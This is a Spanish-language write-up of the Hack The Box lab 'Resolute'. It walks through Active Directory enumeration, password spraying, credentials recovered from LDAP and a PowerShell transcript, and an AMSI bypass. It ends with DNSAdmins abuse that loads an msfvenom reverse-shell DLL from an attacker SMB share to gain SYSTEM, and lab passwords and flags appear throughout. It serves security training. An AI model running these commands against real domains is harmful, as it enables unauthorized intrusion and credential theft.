---
layout: post
title: Resolute
date: 2023-03-06
description:
img:
fig-caption:
tags: [OSCP, OSEP]
---
___

<center><img src="/writeups/assets/img/Resolute-htb/Resolute.png" alt="" style="height: 394px; width:520px;"></center>

***

# Conocimientos

* Enumeración por RPC

* Enumeración por LDAP

* Password Spraying

* Information Disclosure

* Enumeración con BloodHound

* Abuso del grupo DNSAdmins (Escalada de Privilegios)

***

# Reconocimiento

## Escaneo de puertos con nmap

### Descubrimiento de puertos abiertos

```null
nmap -p- --open --min-rate 5000 -n -Pn -sS 10.10.10.169 -oG openports
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-06 08:39 GMT
Nmap scan report for 10.10.10.169
Host is up (0.090s latency).
Not shown: 65158 closed tcp ports (reset), 354 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49671/tcp open  unknown
49678/tcp open  unknown
49679/tcp open  unknown
49684/tcp open  unknown
49782/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 16.66 seconds
```

### Escaneo de versión y servicios de cada puerto

```null
nmap -sCV -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49671,49678,49679,49684,49782 10.10.10.169 -oN portscan
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-06 08:40 GMT
Nmap scan report for 10.10.10.169
Host is up (0.13s latency).

PORT      STATE  SERVICE      VERSION
53/tcp    open   domain       Simple DNS Plus
88/tcp    open   kerberos-sec Microsoft Windows Kerberos (server time: 2023-03-06 08:47:11Z)
135/tcp   open   msrpc        Microsoft Windows RPC
139/tcp   open   netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open   ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
445/tcp   open   microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGABANK)
464/tcp   open   kpasswd5?
593/tcp   open   ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open   tcpwrapped
3268/tcp  open   ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
3269/tcp  open   tcpwrapped
5985/tcp  open   http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open   mc-nmf       .NET Message Framing
47001/tcp open   http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open   msrpc        Microsoft Windows RPC
49665/tcp open   msrpc        Microsoft Windows RPC
49666/tcp open   msrpc        Microsoft Windows RPC
49667/tcp open   msrpc        Microsoft Windows RPC
49671/tcp open   msrpc        Microsoft Windows RPC
49678/tcp open   msrpc        Microsoft Windows RPC
49679/tcp open   ncacn_http   Microsoft Windows RPC over HTTP 1.0
49684/tcp open   msrpc        Microsoft Windows RPC
49782/tcp closed unknown
Service Info: Host: RESOLUTE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h46m58s, deviation: 4h37m08s, median: 6m58s
| smb2-time: 
|   date: 2023-03-06T08:48:06
|_  start_date: 2023-03-06T08:43:37
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: Resolute
|   NetBIOS computer name: RESOLUTE\x00
|   Domain name: megabank.local
|   Forest name: megabank.local
|   FQDN: Resolute.megabank.local
|_  System time: 2023-03-06T00:48:03-08:00
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 70.73 seconds
```

Agrego el dominio ```megabank.local``` al ```/etc/hosts```, junto al subdominio ````resolute.megabank.local```

## Puerto 53 (DNS)

Con ```dig``` aplico consultas DNS

```null
dig @10.10.10.169 megabank.local ns

; <<>> DiG 9.18.12-1-Debian <<>> @10.10.10.169 megabank.local ns
; (1 server found)
;; global options: +cmd
;; Got answer:
;; WARNING: .local is reserved for Multicast DNS
;; You are currently testing what happens when an mDNS query is leaked to DNS
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 41364
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 2

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
;; QUESTION SECTION:
;megabank.local.			IN	NS

;; ANSWER SECTION:
megabank.local.		3600	IN	NS	resolute.megabank.local.

;; ADDITIONAL SECTION:
resolute.megabank.local. 3600	IN	A	10.10.10.169

;; Query time: 80 msec
;; SERVER: 10.10.10.169#53(10.10.10.169) (UDP)
;; WHEN: Mon Mar 06 08:44:43 GMT 2023
;; MSG SIZE  rcvd: 82
```

```null
dig @10.10.10.169 megabank.local mx

; <<>> DiG 9.18.12-1-Debian <<>> @10.10.10.169 megabank.local mx
; (1 server found)
;; global options: +cmd
;; Got answer:
;; WARNING: .local is reserved for Multicast DNS
;; You are currently testing what happens when an mDNS query is leaked to DNS
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 64745
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 0, AUTHORITY: 1, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
;; QUESTION SECTION:
;megabank.local.			IN	MX

;; AUTHORITY SECTION:
megabank.local.		3600	IN	SOA	resolute.megabank.local. hostmaster.megabank.local. 152 900 600 86400 3600

;; Query time: 532 msec
;; SERVER: 10.10.10.169#53(10.10.10.169) (UDP)
;; WHEN: Mon Mar 06 08:44:59 GMT 2023
;; MSG SIZE  rcvd: 99
```

```null
dig @10.10.10.169 megabank.local axfr

; <<>> DiG 9.18.12-1-Debian <<>> @10.10.10.169 megabank.local axfr
; (1 server found)
;; global options: +cmd
; Transfer failed.
```

## Puerto 445 (SMB)

Con ```crackmapexec``` aplico un escaneo para ver hostname, dominio y versiones

```null
crackmapexec smb 10.10.10.169
SMB         10.10.10.169    445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)
```

No puedo listar los recursos compartidos

```null
smbmap -H 10.10.10.169 -u 'null'
[!] Authentication error on 10.10.10.169
```

## Puerto 135 (RPC)

Con ```rpcclient``` puedo listar todos los usuarios del directorio activo

```null
rpcclient -U "" 10.10.10.169 -N -c 'enumdomusers' | grep -oP '\[.*?\]' | grep -v "0x" | tr -d "[]" > users
```

Los valido por Kerberos

```null
kerbrute userenum -d megabank.local --dc 10.10.10.169 users

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 03/06/23 - Ronnie Flathers @ropnop

2023/03/06 08:49:46 >  Using KDC(s):
2023/03/06 08:49:46 >   10.10.10.169:88

2023/03/06 08:49:46 >  [+] VALID USERNAME:   Administrator@megabank.local
2023/03/06 08:49:46 >  [+] VALID USERNAME:   ryan@megabank.local
2023/03/06 08:49:46 >  [+] VALID USERNAME:   sally@megabank.local
2023/03/06 08:49:46 >  [+] VALID USERNAME:   sunita@megabank.local
2023/03/06 08:49:46 >  [+] VALID USERNAME:   marcus@megabank.local
2023/03/06 08:49:46 >  [+] VALID USERNAME:   abigail@megabank.local
2023/03/06 08:49:46 >  [+] VALID USERNAME:   marko@megabank.local
2023/03/06 08:49:46 >  [+] VALID USERNAME:   fred@megabank.local
2023/03/06 08:49:46 >  [+] VALID USERNAME:   stevie@megabank.local
2023/03/06 08:49:46 >  [+] VALID USERNAME:   gustavo@megabank.local
2023/03/06 08:49:46 >  [+] VALID USERNAME:   angela@megabank.local
2023/03/06 08:49:46 >  [+] VALID USERNAME:   ulf@megabank.local
2023/03/06 08:49:46 >  [+] VALID USERNAME:   felicia@megabank.local
2023/03/06 08:49:46 >  [+] VALID USERNAME:   paulo@megabank.local
2023/03/06 08:49:46 >  [+] VALID USERNAME:   claire@megabank.local
2023/03/06 08:49:46 >  [+] VALID USERNAME:   steve@megabank.local
2023/03/06 08:49:46 >  [+] VALID USERNAME:   annika@megabank.local
2023/03/06 08:49:46 >  [+] VALID USERNAME:   annette@megabank.local
2023/03/06 08:49:46 >  [+] VALID USERNAME:   simon@megabank.local
2023/03/06 08:49:46 >  [+] VALID USERNAME:   claude@megabank.local
2023/03/06 08:49:46 >  [+] VALID USERNAME:   per@megabank.local
2023/03/06 08:49:46 >  [+] VALID USERNAME:   melanie@megabank.local
2023/03/06 08:49:46 >  [+] VALID USERNAME:   zach@megabank.local
2023/03/06 08:49:46 >  [+] VALID USERNAME:   naoki@megabank.local
2023/03/06 08:49:46 >  Done! Tested 27 usernames (24 valid) in 0.371 seconds
```

Tres de ellos no eran válidos. Ninguno de ellos es ASPRoasteable

```null
GetNPUsers.py megabank.local/ -no-pass -usersfie users
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

usage: GetNPUsers.py [-h] [-request] [-outputfile OUTPUTFILE] [-format {hashcat,john}] [-usersfile USERSFILE] [-ts] [-debug] [-hashes LMHASH:NTHASH] [-no-pass] [-k] [-aesKey hex key] [-dc-ip ip address]
                     target
GetNPUsers.py: error: unrecognized arguments: -usersfie users
❯ GetNPUsers.py megabank.local/ -no-pass -usersfile users
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User ryan doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User sally doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User sunita doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User marcus doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User abigail doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User marko doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User fred doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User stevie doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User gustavo doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User angela doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User ulf doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User felicia doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User paulo doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User claire doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User steve doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User annika doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User annette doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User simon doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User claude doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User per doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User melanie doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User zach doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User naoki doesn't have UF_DONT_REQUIRE_PREAUTH set
```

## Puerto 389 (LDAP)

Con ```ldapsearch```, enumero los namingcontexts

```null
ldapsearch -x -s base namingcontexts -H ldap://10.10.10.169:389
# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: namingcontexts 
#

#
dn:
namingContexts: DC=megabank,DC=local
namingContexts: CN=Configuration,DC=megabank,DC=local
namingContexts: CN=Schema,CN=Configuration,DC=megabank,DC=local
namingContexts: DC=DomainDnsZones,DC=megabank,DC=local
namingContexts: DC=ForestDnsZones,DC=megabank,DC=local

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1
```

Para los namingContexts ```DC=megabank,DC=local``` dumpeo información

```null
ldapsearch -x -b "DC=megabank,DC=local" -H ldap://10.10.10.169:389
```

Para uno de ellos se a guardado su contraseña en la descripción

```null
# Marko Novak, Employees, MegaBank Users, megabank.local
dn: CN=Marko Novak,OU=Employees,OU=MegaBank Users,DC=megabank,DC=local
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Marko Novak
sn: Novak
description: Account created. Password set to Welcome123!
givenName: Marko
distinguishedName: CN=Marko Novak,OU=Employees,OU=MegaBank Users,DC=megabank,D
 C=local
```

No es válida para él, pero si para otro usuario

```null
crackmapexec smb 10.10.10.169 -u users -p 'Welcome123!' --continue-on-success | grep "+"
SMB         10.10.10.169    445    RESOLUTE         [+] megabank.local\melanie:Welcome123! 
```

Otra forma de haber llegado a la misma conclusión es desde el propio RPC

```nullrpcclient -U "" 10.10.10.169 -N -c 'querydispinfo'
index: 0x10b0 RID: 0x19ca acb: 0x00000010 Account: abigail      Name: (null)    Desc: (null)
index: 0xfbc RID: 0x1f4 acb: 0x00000210 Account: Administrator  Name: (null)    Desc: Built-in account for administering the computer/domain
index: 0x10b4 RID: 0x19ce acb: 0x00000010 Account: angela       Name: (null)    Desc: (null)
index: 0x10bc RID: 0x19d6 acb: 0x00000010 Account: annette      Name: (null)    Desc: (null)
index: 0x10bd RID: 0x19d7 acb: 0x00000010 Account: annika       Name: (null)    Desc: (null)
index: 0x10b9 RID: 0x19d3 acb: 0x00000010 Account: claire       Name: (null)    Desc: (null)
index: 0x10bf RID: 0x19d9 acb: 0x00000010 Account: claude       Name: (null)    Desc: (null)
index: 0xfbe RID: 0x1f7 acb: 0x00000215 Account: DefaultAccount Name: (null)    Desc: A user account managed by the system.
index: 0x10b5 RID: 0x19cf acb: 0x00000010 Account: felicia      Name: (null)    Desc: (null)
index: 0x10b3 RID: 0x19cd acb: 0x00000010 Account: fred Name: (null)    Desc: (null)
index: 0xfbd RID: 0x1f5 acb: 0x00000215 Account: Guest  Name: (null)    Desc: Built-in account for guest access to the computer/domain
index: 0x10b6 RID: 0x19d0 acb: 0x00000010 Account: gustavo      Name: (null)    Desc: (null)
index: 0xff4 RID: 0x1f6 acb: 0x00000011 Account: krbtgt Name: (null)    Desc: Key Distribution Center Service Account
index: 0x10b1 RID: 0x19cb acb: 0x00000010 Account: marcus       Name: (null)    Desc: (null)
index: 0x10a9 RID: 0x457 acb: 0x00000210 Account: marko Name: Marko Novak       Desc: Account created. Password set to Welcome123!
index: 0x10c0 RID: 0x2775 acb: 0x00000010 Account: melanie      Name: (null)    Desc: (null)
index: 0x10c3 RID: 0x2778 acb: 0x00000010 Account: naoki        Name: (null)    Desc: (null)
index: 0x10ba RID: 0x19d4 acb: 0x00000010 Account: paulo        Name: (null)    Desc: (null)
index: 0x10be RID: 0x19d8 acb: 0x00000010 Account: per  Name: (null)    Desc: (null)
index: 0x10a3 RID: 0x451 acb: 0x00000210 Account: ryan  Name: Ryan Bertrand     Desc: (null)
index: 0x10b2 RID: 0x19cc acb: 0x00000010 Account: sally        Name: (null)    Desc: (null)
index: 0x10c2 RID: 0x2777 acb: 0x00000010 Account: simon        Name: (null)    Desc: (null)
index: 0x10bb RID: 0x19d5 acb: 0x00000010 Account: steve        Name: (null)    Desc: (null)
index: 0x10b8 RID: 0x19d2 acb: 0x00000010 Account: stevie       Name: (null)    Desc: (null)
index: 0x10af RID: 0x19c9 acb: 0x00000010 Account: sunita       Name: (null)    Desc: (null)
index: 0x10b7 RID: 0x19d1 acb: 0x00000010 Account: ulf  Name: (null)    Desc: (null)
index: 0x10c1 RID: 0x2776 acb: 0x00000010 Account: zach Name: (null)    Desc: (null)
```

La contraseña es válida por ```winrm```

```null
crackmapexec winrm 10.10.10.169 -u 'melanie' -p 'Welcome123!'
SMB         10.10.10.169    5985   RESOLUTE         [*] Windows 10.0 Build 14393 (name:RESOLUTE) (domain:megabank.local)
HTTP        10.10.10.169    5985   RESOLUTE         [*] http://10.10.10.169:5985/wsman
WINRM       10.10.10.169    5985   RESOLUTE         [+] megabank.local\melanie:Welcome123! (Pwn3d!)
```

Puedo ver la primera flag

```null
evil-winrm -i 10.10.10.169 -u 'melanie' -p 'Welcome123!'

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\melanie\Documents> cd ..
*Evil-WinRM* PS C:\Users\melanie> cd Desktop
*Evil-WinRM* PS C:\Users\melanie\Desktop> dir


    Directory: C:\Users\melanie\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---         3/6/2023  12:44 AM             34 user.txt


*Evil-WinRM* PS C:\Users\melanie\Desktop> type user.txt
e1ddf84407db61b8ca645240e32195ad
```

# Escalada

Subo el ```SharpHound.exe``` para aplicar reconocimiento por ```BloodHound```

```null
*Evil-WinRM* PS C:\Users\melanie\Desktop> upload /opt/SharpHound.exe
*Evil-WinRM* PS C:\Users\melanie\Desktop> .\SharpHound.exe
*Evil-WinRM* PS C:\Users\melanie\Desktop> copy .\20230306012140_BloodHound.zip \\10.10.16.9\shared\bh.zip
```

Para importarme el ```Powerview.ps1``` sin problemas, utilizo el Bypass-4MSI de ```evil-winrm```

```null
*Evil-WinRM* PS C:\Users\melanie\Desktop> Bypass-4MSI

Info: Patching 4MSI, please be patient...

[+] Success!
```

```null
*Evil-WinRM* PS C:\Users\melanie\Desktop> Import-Module .\PowerView.ps1

```

En la raíz hay un directorio llamado ```PSTranscripts``` 

```null
*Evil-WinRM* PS C:\> dir -force


    Directory: C:\


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d--hs-         3/6/2023   1:46 AM                $RECYCLE.BIN
d--hsl        9/25/2019  10:17 AM                Documents and Settings
d-----        9/25/2019   6:19 AM                PerfLogs
d-r---        9/25/2019  12:39 PM                Program Files
d-----       11/20/2016   6:36 PM                Program Files (x86)
d--h--        9/25/2019  10:48 AM                ProgramData
d--h--        12/3/2019   6:32 AM                PSTranscripts
d--hs-        9/25/2019  10:17 AM                Recovery
d--hs-        9/25/2019   6:25 AM                System Volume Information
d-r---        12/4/2019   2:46 AM                Users
d-----        12/4/2019   5:15 AM                Windows
-arhs-       11/20/2016   5:59 PM         389408 bootmgr
-a-hs-        7/16/2016   6:10 AM              1 BOOTNXT
-a-hs-         3/6/2023  12:43 AM      402653184 pagefile.sys
```

```null
*Evil-WinRM* PS C:\PSTranscripts> dir -force


    Directory: C:\PSTranscripts


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d--h--        12/3/2019   6:45 AM                20191203
```

```null
*Evil-WinRM* PS C:\PSTranscripts\20191203> dir -force


    Directory: C:\PSTranscripts\20191203


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-arh--        12/3/2019   6:45 AM           3732 PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt
```

Dentro hay credenciales para el usuario ryan

```null
PS>CommandInvocation(Invoke-Expression): "Invoke-Expression"
>> ParameterBinding(Invoke-Expression): name="Command"; value="cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!
```

Son válidas por winrm

```null
crackmapexec winrm 10.10.10.169 -u 'ryan' -p 'Serv3r4Admin4cc123!'
SMB         10.10.10.169    5985   RESOLUTE         [*] Windows 10.0 Build 14393 (name:RESOLUTE) (domain:megabank.local)
HTTP        10.10.10.169    5985   RESOLUTE         [*] http://10.10.10.169:5985/wsman
WINRM       10.10.10.169    5985   RESOLUTE         [+] megabank.local\ryan:Serv3r4Admin4cc123! (Pwn3d!)
```

```null
evil-winrm -i 10.10.10.169 -u 'ryan' -p 'Serv3r4Admin4cc123!'

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\ryan\Documents> 
```

Este usuario pertenece al grupo ```Contractors```

```null
*Evil-WinRM* PS C:\Users\ryan\Documents> net user ryan
User name                    ryan
Full Name                    Ryan Bertrand
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            3/6/2023 2:02:02 AM
Password expires             Never
Password changeable          3/7/2023 2:02:02 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   Never

Logon hours allowed          All

Local Group Memberships
Global Group memberships     *Domain Users         *Contractors
The command completed successfully.
```

Este grupo es miembro de ```DNS Admins```

<img src="/writeups/assets/img/Resolute-htb/1.png" alt="">

Por tanto, puedo crear una DLL que se encargue de enviarme una reverse shell para cargarla en un servicio y se ejecute al reiniciarlo

```null
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.16.9 LPORT=443 -f dll -o pwned.dll
```

```null
*Evil-WinRM* PS C:\Users\ryan\Documents> dnscmd /config /serverlevelplugindll \\10.10.16.9\shared\pwned.dll

Registry property serverlevelplugindll successfully reset.
Command completed successfully.
```

En mi equipo me comparto un servicio por SMB

```null
impacket-smbserver shared $(pwd) -smb2support
```

Reinicio el servicio

```null
*Evil-WinRM* PS C:\Users\ryan\Documents> sc.exe stop dns
*Evil-WinRM* PS C:\Users\ryan\Documents> sc.exe start dns
```

Gano acceso al sistema y puedo ver la segunda flag

```null
rlwrap nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.9] from (UNKNOWN) [10.10.10.169] 53693
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>type C:\Users\Administrator\Desktop\root.txt
type C:\Users\Administrator\Desktop\root.txt
ea0366482867363c28b17278c6cc81e7
```